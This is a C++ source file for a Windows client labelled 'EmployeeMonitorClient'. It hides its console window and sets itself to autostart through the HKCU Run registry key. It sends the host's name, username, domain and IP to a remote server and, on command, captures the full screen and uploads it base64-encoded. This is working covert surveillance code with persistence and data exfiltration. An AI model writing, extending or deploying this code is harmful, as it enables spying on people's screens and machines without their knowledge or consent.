#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <lmcons.h>
#include <fstream>
#include <ctime>
#include <sstream>
#include <iterator>
#include <atomic>
#include <wincrypt.h> // Для Base64 кодирования
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")

class Client {
    const std::string serverIp;
    const int serverPort;
    SOCKET sock = INVALID_SOCKET;
    std::atomic<bool> running{ false };
    WSADATA wsaData;

    void log(const std::string& message) {
        std::ofstream logFile("client_log.txt", std::ios_base::app);
        if (logFile) {
            time_t now = time(nullptr);
            char dt[26];
            ctime_s(dt, sizeof(dt), &now);
            dt[strlen(dt) - 1] = '\0';
            logFile << "[" << dt << "] " << message << "\n";
        }
    }

    bool tryConnect() {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            log("Socket creation failed: " + std::to_string(WSAGetLastError()));
            return false;
        }

        sockaddr_in serverAddr{};
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(serverPort);
        inet_pton(AF_INET, serverIp.c_str(), &serverAddr.sin_addr);

        if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            log("Connection failed: " + std::to_string(WSAGetLastError()));
            closesocket(sock);
            sock = INVALID_SOCKET;
            return false;
        }
        return true;
    }

    std::string base64_encode(const std::vector<BYTE>& buffer) {
        DWORD base64Len = 0;
        CryptBinaryToStringA(buffer.data(), (DWORD)buffer.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &base64Len);
        std::string result(base64Len, '\0');
        CryptBinaryToStringA(buffer.data(), (DWORD)buffer.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &result[0], &base64Len);
        return result;
    }

    bool sendRequest(const std::string& path, const std::string& body = "") {
        std::string request = "POST " + path + " HTTP/1.1\r\n"
            "Host: " + serverIp + "\r\n"
            "Content-Type: application/json\r\n"
            "Content-Length: " + std::to_string(body.size()) + "\r\n"
            "Connection: keep-alive\r\n\r\n" + body;

        log("Sending request: " + request); // Логируем отправляемый запрос

        if (send(sock, request.c_str(), (int)request.size(), 0) == SOCKET_ERROR) {
            log("Send failed: " + std::to_string(WSAGetLastError()));
            return false;
        }

        // Чтение ответа от сервера
        char response[512];
        int bytesReceived = recv(sock, response, sizeof(response) - 1, 0);
        if (bytesReceived > 0) {
            response[bytesReceived] = '\0'; // Завершаем строку
            log("Response from server: " + std::string(response)); // Логируем ответ от сервера
        }
        else {
            log("No response received or error: " + std::to_string(WSAGetLastError()));
        }

        return true;
    }


    bool registerClient() {
        char hostname[256] = "", username[UNLEN + 1] = "";
        gethostname(hostname, sizeof(hostname));
        DWORD username_len = UNLEN + 1;
        GetUserNameA(username, &username_len);

        // Получаем локальный IP-адрес
        std::string localIp = getLocalIp();

        // Формируем JSON
        std::string params = R"({"ip": ")" + localIp +
            R"(", "hostname": ")" + std::string(hostname) +
            R"(", "username": ")" + std::string(username) +
            R"(", "domain": ")" + getDomain() + R"("})";

        return sendRequest("/register", params);
    }

    std::string getLocalIp() {
        sockaddr_in sa{};
        int sa_len = sizeof(sa);
        if (getsockname(sock, (sockaddr*)&sa, &sa_len) != SOCKET_ERROR) {
            char ip[16];
            inet_ntop(AF_INET, &sa.sin_addr, ip, sizeof(ip));
            return ip;
        }
        return "N/A";
    }

    std::string getDomain() {
        char domain[MAX_PATH];
        DWORD size = MAX_PATH;

        // Попробуем получить доменное имя
        if (GetComputerNameExA(ComputerNameDnsDomain, domain, &size)) {
            // Проверяем, не является ли строка пустой
            if (strlen(domain) > 0) {
                return std::string(domain);
            }
        }

        // Если не удалось получить домен или он пустой, возвращаем "N/A"
        return "N/A";
    }




    void maintainConnection() {
        while (running) {
            if (sock == INVALID_SOCKET && !tryConnect()) {
                std::this_thread::sleep_for(std::chrono::seconds(5));
                continue;
            }

            if (!registerClient()) {
                closesocket(sock);
                sock = INVALID_SOCKET;
                continue;
            }

            while (running && sock != INVALID_SOCKET) {
                if (!sendRequest("/keepalive")) {
                    closesocket(sock);
                    sock = INVALID_SOCKET;
                    break;
                }
                checkForCommands();
                std::this_thread::sleep_for(std::chrono::seconds(3));
            }
        }
    }

    void checkForCommands() {
        fd_set readSet;
        FD_ZERO(&readSet);
        FD_SET(sock, &readSet);
        timeval timeout{ 0, 0 };
        if (select(0, &readSet, nullptr, nullptr, &timeout) > 0 && FD_ISSET(sock, &readSet)) {
            char buffer[128];
            int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes > 0) {
                buffer[bytes] = '\0'; // Завершаем строку
                std::string command(buffer);
                log("Received command: " + command); // Логируем полученную команду
                if (command == "SCREENSHOT") {
                    captureAndSendScreenshot();
                }
            }
            else {
                log("Error receiving command: " + std::to_string(WSAGetLastError()));
            }
        }
    }

    bool captureAndSendScreenshot() {
        // 1. Получаем контекст всего экрана
        HDC hScreen = GetDC(nullptr);
        if (!hScreen) {
            log("Failed to get screen DC");
            return false;
        }

        // 2. Определяем размеры экрана
        int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        if (width <= 0 || height <= 0) {
            log("Invalid screen dimensions");
            ReleaseDC(nullptr, hScreen);
            return false;
        }

        // 3. Создаем контекст в памяти
        HDC hMemory = CreateCompatibleDC(hScreen);
        if (!hMemory) {
            log("Failed to create compatible DC");
            ReleaseDC(nullptr, hScreen);
            return false;
        }

        // 4. Создаем битмап
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
        if (!hBitmap) {
            log("Failed to create compatible bitmap");
            DeleteDC(hMemory);
            ReleaseDC(nullptr, hScreen);
            return false;
        }

        // 5. Выбираем битмап в контекст
        SelectObject(hMemory, hBitmap);

        // 6. Копируем экран в битмап
        if (!BitBlt(hMemory, 0, 0, width, height, hScreen,
            GetSystemMetrics(SM_XVIRTUALSCREEN),
            GetSystemMetrics(SM_YVIRTUALSCREEN), SRCCOPY)) {
            log("BitBlt failed");
            DeleteObject(hBitmap);
            DeleteDC(hMemory);
            ReleaseDC(nullptr, hScreen);
            return false;
        }

        // 7. Подготавливаем заголовки BMP
        BITMAPINFOHEADER bi{ sizeof(BITMAPINFOHEADER) };
        bi.biWidth = width;
        bi.biHeight = height;
        bi.biPlanes = 1;
        bi.biBitCount = 24;
        bi.biCompression = BI_RGB;
        bi.biSizeImage = 0;
        bi.biXPelsPerMeter = 0;
        bi.biYPelsPerMeter = 0;
        bi.biClrUsed = 0;
        bi.biClrImportant = 0;

        DWORD bmpSize = ((width * 3 + 3) & ~3) * height; // Выравнивание по 4 байта
        std::vector<BYTE> pixels(bmpSize);

        // 8. Получаем данные битмапа
        if (!GetDIBits(hMemory, hBitmap, 0, height, pixels.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS)) {
            log("GetDIBits failed");
            DeleteObject(hBitmap);
            DeleteDC(hMemory);
            ReleaseDC(nullptr, hScreen);
            return false;
        }

        // 9. Создаем заголовок файла BMP
        BITMAPFILEHEADER bf{};
        bf.bfType = 0x4D42; // 'BM'
        bf.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpSize;
        bf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

        // 10. Формируем полное изображение
        std::vector<BYTE> image;
        image.insert(image.end(), (BYTE*)&bf, (BYTE*)&bf + sizeof(bf));
        image.insert(image.end(), (BYTE*)&bi, (BYTE*)&bi + sizeof(bi));
        image.insert(image.end(), pixels.begin(), pixels.end());

        // 11. Кодируем в Base64 перед отправкой
        std::string imageBase64 = base64_encode(image);
        std::string json = R"({"screenshot": ")" + imageBase64 + R"(", "format": "bmp"})";

        // 12. Отправляем на сервер
        bool result = sendRequest("/screenshot", json);

        // 13. Очищаем ресурсы
        DeleteObject(hBitmap);
        DeleteDC(hMemory);
        ReleaseDC(nullptr, hScreen);

        return result;
    }


public:
    Client(std::string ip, int port) : serverIp(std::move(ip)), serverPort(port) {
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            log("WSAStartup failed");
            exit(EXIT_FAILURE);
        }
    }

    ~Client() {
        stop();
        WSACleanup();
    }

    void stop() {
        running = false;
        if (sock != INVALID_SOCKET) {
            closesocket(sock);
        }
    }

    void run() {
        running = true;
        setAutoStart();
        maintainConnection();
    }

    void setAutoStart() {
        char path[MAX_PATH];
        GetModuleFileNameA(nullptr, path, MAX_PATH);
        std::string cmd = std::string(path) + " " + serverIp + " " + std::to_string(serverPort);

        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, R"(SOFTWARE\Microsoft\Windows\CurrentVersion\Run)",
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "EmployeeMonitorClient", 0, REG_SZ,
                (BYTE*)cmd.c_str(), (DWORD)cmd.size() + 1);
            RegCloseKey(hKey);
        }
    }
};

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR cmdLine, int) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    std::vector<std::string> args;
    std::istringstream iss(cmdLine);
    args.assign(std::istream_iterator<std::string>{iss},
        std::istream_iterator<std::string>{});

    Client client(args.empty() ? "192.168.0.11" : args[0],
        args.size() < 2 ? 8080 : std::stoi(args[1]));
    client.run();
    return 0;
}
